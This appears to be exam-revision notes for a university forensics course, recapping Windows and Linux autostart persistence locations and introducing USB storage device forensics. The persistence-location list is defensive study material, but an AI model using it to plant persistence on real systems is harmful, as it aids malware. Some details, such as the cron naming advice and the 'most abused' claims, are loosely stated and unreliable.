> 3. **Confusing SysV init with systemd** — Modern Linux uses systemd by default. If you only describe `/etc/rc.local` and ignore systemd units, you lose marks.
>
> 4. **No forensic tie-in** — Pure "list" answers score poorly. Examiners expect you to state *how* the ASEP is **forensically exploited** (e.g., "this location is checked for unauthorized entries to detect malware persistence").
>
> 5. **Spelling `cron` as `crond` or `crontab` as `crontabs`** — `cron` is the daemon, `crontab` is the file. Confusing these is a minor mark-deduction.
>
> 6. **Not using diagrams** — A clear flowchart of the boot sequence can earn 2–3 extra marks for visual presentation.

---

## 5.4 Topic Recap & Important Things to Remember

> [!NOTE]
> **Rapid Revision Checklist — High-Yield for KTU 2024 ESE**

- **Definition:** ASEPs are OS-controlled hooks for automatic program execution — *primary persistence vectors* for malware.
- **MITRE ATT&CK Reference:** Technique **T1547** (Boot or Logon Autostart Execution).
- **Windows Minimum ASEPs to Memorize (≥ 6):**
  - `HKLM\...\Run`, `HKCU\...\Run`
  - `HKLM\...\RunOnce`, `HKCU\...\RunOnce`
  - `Winlogon\Shell`, `Winlogon\Userinit`
  - `BootExecute` (Session Manager)
  - `LSA\Security Packages`, `LSA\Notification Packages`
  - `AppInit_DLLs`
  - Startup folders (Common + User)
  - Services (`Start = 0, 1, 2`)
  - Scheduled Tasks (`C:\Windows\System32\Tasks\`)
- **Linux Minimum ASEPs to Memorize (≥ 5):**
  - `/etc/rc.local`
  - `/etc/init.d/` and `/etc/rc<runlevel>.d/`
  - `/etc/systemd/system/*.service` and `~/.config/systemd/user/*.service`
  - `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/crontabs/<user>`
  - `/etc/profile`, `~/.bashrc`, `~/.bash_profile`
  - `/etc/xdg/autostart/` and `~/.config/autostart/`
- **Timestamp Standards:** Windows = `FILETIME` (100-ns since 1601); Linux = `Unix Epoch` (seconds since 1970).
- **Standard Forensic Tools:** Sysinternals **Autoruns**, **RegRipper**, **Kansa**, **chkrootkit**, **rkhunter**, **The Sleuth Kit** (`fls`, `mactime`).
- **Most Abused ASEP in Real-World Malware:** `HKCU\...\Run` (Windows) and `~/.bashrc` (Linux).
- **Boot-Stage ASEP** (executes before AV loads): `BootExecute` — *highest forensic priority* in rootkit investigations.
- **Modern Default Init System on Linux:** **systemd** (since ~2015 for major distributions).
- **Critical Forensic Principle:** ASEP timestamps must be correlated with the incident window to distinguish legitimate additions from malicious ones.
- **Forensic Soundness:** Always work on a **bit-stream copy**, never the original disk.
- **Reporting Requirement:** Every ASEP finding must include (a) location, (b) command/path, (c) timestamp, (d) SHA-256 hash, (e) signature status, and (f) chain-of-custody record.

---

<!-- SECTION_5_END -->

topics.title: USB Removable Storage Devices
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT866 - WINDOWS AND LINUX FORFORENSICS
> - **Module:** Module 3
> - **Topic:** USB Removable Storage Devices

<!-- SECTION_1_START -->
# Section 1: Core Technical Definition & Intuitive Overview of USB Removable Storage Devices

## 1.1 Formal Academic Definition

A **USB (Universal Serial Bus) Removable Storage Device** in the context of digital forensics refers to any portable, hot-swappable storage medium that connects to a computing system through the USB interface, including but not limited to USB flash drives (thumb drives), external hard disk drives (HDDs), solid-state drives (SSDs), memory card readers, and USB-attached mobile devices operating in Mass Storage Class (MSC) mode. In forensic investigation, such devices are treated as **evidentiary artifacts of immense probative value** because they preserve traces of prior connectivity, data exchange, user attribution, and timeline reconstruction.

> [!IMPORTANT]
> **KTU 2024 Definition (Syllabus-aligned):**
> USB removable storage devices in forensic science are investigated to recover deleted files, track device connection history, identify the data owner, and correlate the device with the host system's timeline of use. The investigation follows the principles of **non-repudiation**, **chain of custody**, and **data integrity** (verifiable via cryptographic hashes such as **SHA-256** and **MD5**).

## 1.2 Conceptual Analogy / Intuition

> [!NOTE]
> **Real-World Analogy — "The Hotel Visitor's Logbook"**
>
> Imagine a secured office building. Every visitor who enters must register at the front desk — writing their **name**, **arrival time**, **purpose of visit**, and the **room numbers they accessed**. Even if the visitor later leaves and the room is cleaned, the **logbook entry remains** as a permanent record.
>
> Similarly, when a USB device is plugged into a Windows or Linux system, the operating system automatically creates and updates a series of **registry keys**, **log files**, **Prefetch entries**, and **shortcut (LNK) files** that act as the "visitor's logbook." Forensic investigators later read this logbook to determine:
> - **Who** plugged the device in (associated user account)
> - **When** it was connected (timestamp)
> - **What** files were opened from it (access artifacts)
> - **What** data was transferred (file system artifacts)
> - **How long** the device was used (dwell time)

## 1.3 Classification of USB Removable Storage

USB removable storage is broadly classified by the **USB Mass Storage Class (MSC)** specification and by physical media type:

| Category | Example Devices | Typical Capacity | Common File System |
|---|---|---|---|
| **USB Flash Drive** | Pen drives, thumb drives | 4 GB – 2 TB | FAT32, NTFS, exFAT |
| **External HDD** | Portable spinning disks | 500 GB – 18 TB | NTFS, exFAT, HFS+ |
| **External SSD** | Portable NVMe/SATA SSDs | 250 GB – 8 TB | NTFS, exFAT, APFS |
| **Memory Card Reader** | SD/microSD adapters | 2 GB – 1 TB | FAT32, exFAT |
| **USB-Attached Phone** | Android in MTP/PTP mode | 32 GB – 512 GB | Internal FS via MTP |
| **USB Optical Drive** | External DVD/Blu-ray | 4.7 GB – 100 GB | ISO 9660, UDF |

## 1.4 Why USB Forensics Matters in the KTU Curriculum

> [!IMPORTANT]
> **High-Yield KTU Board Point:**
> USB devices are the **#1 vector for data exfiltration** in corporate espionage cases and the **#1 vector for evidence introduction** in criminal cases. A single USB drive can transfer **gigabytes of data in seconds**, making it critical for forensic examiners to identify, preserve, and analyze the artifacts left behind.

Key forensic scenarios:
1. **Intellectual Property Theft** — confidential files copied to USB before employee resignation.
2. **Child Exploitation Investigations (CEI)** — suspect material transported via USB.
3. **Insider Threat / Data Leakage** — large-volume data movement to removable media.
4. **Malware Propagation** — USB-borne worms (e.g., Stuxnet, Conficker, BadUSB).
5. **Counter-Terrorism** — recovered USB devices from suspects.

## 1.5 Key Forensic Metrics & Standards

- **Hashing Algorithms:** **MD5 (128-bit)** and **SHA-256 (256-bit)** for evidence integrity.
- **Write-Blockers:** Hardware devices (Tableau, WiebeTech) or software solutions that prevent write operations to the source device.
- **Imaging Formats:** **E01 (EnCase)**, **DD (raw)**, **AFF (Advanced Forensic Format)**.
- **USB Standards:** USB 1.1 (12 Mbps), USB 2.0 (480 Mbps), USB 3.0/3.1/3.2 (5–20 Gbps), USB4 (40 Gbps).
- **Storage Capacity Limits per File System:** FAT32 = **4 GB max file size**, exFAT = **16 EB theoretical**, NTFS = **16 TB practical**.
